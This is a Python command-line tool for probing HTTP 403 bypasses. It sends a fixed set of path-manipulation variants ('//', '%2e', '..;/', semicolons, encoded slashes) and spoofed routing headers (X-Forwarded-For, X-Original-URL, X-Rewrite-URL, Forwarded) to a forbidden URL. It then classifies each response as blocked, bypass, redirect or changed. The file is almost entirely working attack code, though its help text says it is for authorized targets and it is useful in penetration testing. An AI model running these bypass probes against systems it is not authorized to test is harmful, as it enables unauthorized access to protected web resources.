#!/usr/bin/env python3
"""Probe controlled HTTP 403 bypass variants and compare responses."""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import html
import http.client
import json
import re
import socket
import ssl
import sys
from dataclasses import asdict, dataclass
from pathlib import Path
from urllib.parse import quote, quote_plus, urlsplit, urlunsplit


MAX_RESPONSE_BYTES = 1024 * 1024
TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.IGNORECASE | re.DOTALL)
SPACE_RE = re.compile(r"\s+")
ACCESS_STATUSES = {200, 204, 206}
REDIRECT_STATUSES = {301, 302, 303, 307, 308}
AUTH_STATUSES = {401, 407}


@dataclass(frozen=True)
class Response:
    variant: str
    category: str
    status: int | None = None
    length: int | None = None
    content_type: str = ""
    title: str = ""
    location: str = ""
    body_sha256: str = ""
    error: str = ""


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Probe finite HTTP 403 bypass variants on an authorized target.",
    )
    parser.add_argument("--url", required=True, help="target URL expected to return HTTP 403")
    parser.add_argument("--header", action="append", default=[], help="base header: 'Name: value'")
    parser.add_argument("--threads", type=int, default=5, help="worker count (1-20, default: 5)")
    parser.add_argument("--timeout", type=int, default=10, help="request timeout in seconds (1-60)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument("--force", action="store_true", help="continue when baseline is not HTTP 403")
    parser.add_argument("--all", action="store_true", help="print blocked and error results as well")
    parser.add_argument("--output", help="optional JSONL output path")
    args = parser.parse_args()

    if not 1 <= args.threads <= 20:
        parser.error("--threads must be between 1 and 20")
    if not 1 <= args.timeout <= 60:
        parser.error("--timeout must be between 1 and 60")
    return args


def parse_target(raw_url: str) -> tuple[str, int, str, str, str, str, bool]:
    parsed = urlsplit(raw_url)
    if parsed.scheme.lower() not in {"http", "https"}:
        raise ValueError("--url must use http:// or https://")
    if not parsed.hostname:
        raise ValueError("--url must include a hostname or IP address")
    if parsed.username is not None or parsed.password is not None:
        raise ValueError("credentials in --url are not supported; use --header")

    scheme = parsed.scheme.lower()
    port = parsed.port or (443 if scheme == "https" else 80)
    default_port = 443 if scheme == "https" else 80
    host = parsed.hostname
    host_header = f"[{host}]" if ":" in host else host
    if port != default_port:
        host_header = f"{host_header}:{port}"
    path = parsed.path or "/"
    query = parsed.query
    return scheme, port, host, host_header, path, query, scheme == "https"


def parse_headers(values: list[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for raw in values:
        if ":" not in raw:
            raise ValueError(f"invalid header: {raw!r}")
        name, value = raw.split(":", 1)
        name = name.strip()
        value = value.strip()
        if not name or any(ord(char) < 33 or char == ":" for char in name):
            raise ValueError(f"invalid header name: {name!r}")
        if name.casefold() == "host":
            raise ValueError("Host header overrides are outside this tool's scope")
        if "\r" in name + value or "\n" in name + value:
            raise ValueError("header values must not contain newlines")
        headers[name] = value
    return headers


def resolve_seed_ip(host: str) -> str:
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except OSError:
        return "127.0.0.1"
    for family, _, _, _, sockaddr in results:
        if family in {socket.AF_INET, socket.AF_INET6} and sockaddr:
            return str(sockaddr[0])
    return "127.0.0.1"


def with_query(path: str, query: str) -> str:
    return f"{path}?{query}" if query else path


def path_variants(path: str) -> list[tuple[str, str]]:
    clean = "/" + path.lstrip("/")
    values = [
        ("path:double-slash", "//" + clean.lstrip("/")),
        ("path:trailing-slash", clean + "/"),
        ("path:double-trailing-slash", clean + "//"),
        ("path:dot-segment", clean + "/."),
        ("path:encoded-dot-prefix", "/%2e" + clean),
        ("path:encoded-dot-suffix", clean + "/%2e/"),
        ("path:semicolon", clean + ";"),
        ("path:semicolon-slash", clean + ";/"),
        ("path:dot-semicolon", clean + "/..;/"),
        ("path:encoded-slash", clean + "%2f"),
        ("path:space-suffix", clean + "%20"),
        ("path:double-encoded-dot", "/%252e" + clean),
    ]
    return values


def header_variants(host: str, seed_ip: str) -> list[tuple[str, dict[str, str]]]:
    forwarded = f"for={seed_ip};host={host};proto=http"
    return [
        ("header:x-forwarded-for", {"X-Forwarded-For": seed_ip}),
        ("header:x-real-ip", {"X-Real-IP": seed_ip}),
        ("header:x-client-ip", {"X-Client-IP": seed_ip}),
        ("header:x-remote-addr", {"X-Remote-Addr": seed_ip}),
        ("header:x-originating-ip", {"X-Originating-IP": seed_ip}),
        ("header:x-forwarded-host", {"X-Forwarded-Host": host}),
        ("header:x-forwarded-server", {"X-Forwarded-Server": host}),
        ("header:x-original-host", {"X-Original-Host": host}),
        ("header:x-original-url", {"X-Original-URL": "/"}),
        ("header:x-rewrite-url", {"X-Rewrite-URL": "/"}),
        ("header:x-forwarded-prefix", {"X-Forwarded-Prefix": "/"}),
        ("header:forwarded", {"Forwarded": forwarded}),
    ]


def normalize_reflection(text: str, values: set[str]) -> str:
    expanded: set[str] = set()
    for value in values:
        if not value:
            continue
        expanded.update(
            {
                value,
                value.lower(),
                html.escape(value, quote=True),
                quote(value, safe=""),
                quote_plus(value, safe=""),
            }
        )
    for value in sorted(expanded, key=len, reverse=True):
        text = text.replace(value, "<VALUE>")
    return text


def extract_title(body: str) -> str:
    match = TITLE_RE.search(body)
    if not match:
        return ""
    return SPACE_RE.sub(" ", html.unescape(match.group(1))).strip()[:200]


def request_variant(
    *,
    variant: str,
    scheme: str,
    port: int,
    target_host: str,
    host_header: str,
    path: str,
    bypass_headers: dict[str, str],
    base_headers: dict[str, str],
    timeout: int,
    insecure: bool,
    reflect_values: set[str],
) -> Response:
    connection: http.client.HTTPConnection
    if scheme == "https":
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        connection = http.client.HTTPSConnection(
            target_host,
            port,
            timeout=timeout,
            context=context,
        )
    else:
        connection = http.client.HTTPConnection(target_host, port, timeout=timeout)

    headers = {
        "Host": host_header,
        "User-Agent": "bypass403/1.0",
        "Accept": "*/*",
        "Connection": "close",
    }
    headers.update(base_headers)
    headers.update(bypass_headers)

    try:
        connection.request("GET", path, headers=headers)
        response = connection.getresponse()
        raw_body = response.read(MAX_RESPONSE_BYTES)
        body = raw_body.decode("utf-8", errors="replace")
        normalized = normalize_reflection(body, reflect_values)
        title = normalize_reflection(extract_title(body), reflect_values)
        location = normalize_reflection(response.getheader("Location", ""), reflect_values)
        return Response(
            variant=variant,
            category="observed",
            status=response.status,
            length=response.length if response.length is not None else len(raw_body),
            content_type=response.getheader("Content-Type", ""),
            title=title,
            location=location,
            body_sha256=hashlib.sha256(normalized.encode("utf-8")).hexdigest(),
        )
    except Exception as exc:
        return Response(
            variant=variant,
            category="error",
            error=f"{type(exc).__name__}: {exc}",
        )
    finally:
        connection.close()


def classify(response: Response, baseline: Response) -> Response:
    if response.category == "error":
        return response
    if response.status == 403:
        category = "blocked"
    elif response.status in ACCESS_STATUSES:
        category = "bypass"
    elif response.status in REDIRECT_STATUSES:
        category = "redirect"
    elif response.status in AUTH_STATUSES:
        category = "auth_required"
    elif response.status is not None and response.status >= 500:
        category = "error"
    else:
        same = (
            response.status == baseline.status
            and response.body_sha256 == baseline.body_sha256
            and response.title == baseline.title
            and response.location == baseline.location
        )
        category = "changed" if not same else "blocked"
    return Response(**{**asdict(response), "category": category})


def main() -> int:
    try:
        args = parse_args()
        scheme, port, target_host, host_header, raw_path, query, is_https = parse_target(
            args.url
        )
        base_headers = parse_headers(args.header)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    seed_ip = resolve_seed_ip(target_host)
    reflect_values = {target_host, host_header, seed_ip}
    common = {
        "scheme": scheme,
        "port": port,
        "target_host": target_host,
        "host_header": host_header,
        "base_headers": base_headers,
        "timeout": args.timeout,
        "insecure": args.insecure and is_https,
        "reflect_values": reflect_values,
    }

    baseline = request_variant(
        variant="baseline",
        path=with_query(raw_path, query),
        bypass_headers={},
        **common,
    )
    if baseline.category == "error":
        print(f"error: baseline request failed: {baseline.error}", file=sys.stderr)
        return 2
    if baseline.status != 403 and not args.force:
        print(
            f"error: baseline returned HTTP {baseline.status}, expected 403; use --force to continue",
            file=sys.stderr,
        )
        return 2

    variants: list[tuple[str, str, dict[str, str]]] = []
    for name, value in header_variants(target_host, seed_ip):
        variants.append((name, with_query(raw_path, query), value))
    for name, path in path_variants(raw_path):
        variants.append((name, with_query(path, query), {}))

    results: list[Response] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(
                request_variant,
                variant=name,
                path=path,
                bypass_headers=headers,
                **common,
            )
            for name, path, headers in variants
        ]
        try:
            for future in concurrent.futures.as_completed(futures):
                results.append(classify(future.result(), baseline))
        except KeyboardInterrupt:
            executor.shutdown(wait=False, cancel_futures=True)
            print("interrupted", file=sys.stderr)
            return 130

    results.sort(key=lambda item: item.variant)
    default_categories = {"bypass", "redirect", "auth_required", "changed"}
    selected = results if args.all else [
        item for item in results if item.category in default_categories
    ]

    output = sys.stdout
    output_handle = None
    if args.output:
        output_handle = Path(args.output).open("w", encoding="utf-8")
        output = output_handle
    try:
        for result in selected:
            output.write(json.dumps(asdict(result), ensure_ascii=False) + "\n")
            output.flush()
    finally:
        if output_handle is not None:
            output_handle.close()

    counts = {
        category: sum(item.category == category for item in results)
        for category in ("bypass", "redirect", "auth_required", "changed", "blocked", "error")
    }
    print(
        f"baseline={baseline.status} tested={len(results)} "
        + " ".join(f"{name}={count}" for name, count in counts.items()),
        file=sys.stderr,
    )
    if not selected:
        print("no non-blocked 403 variants found", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
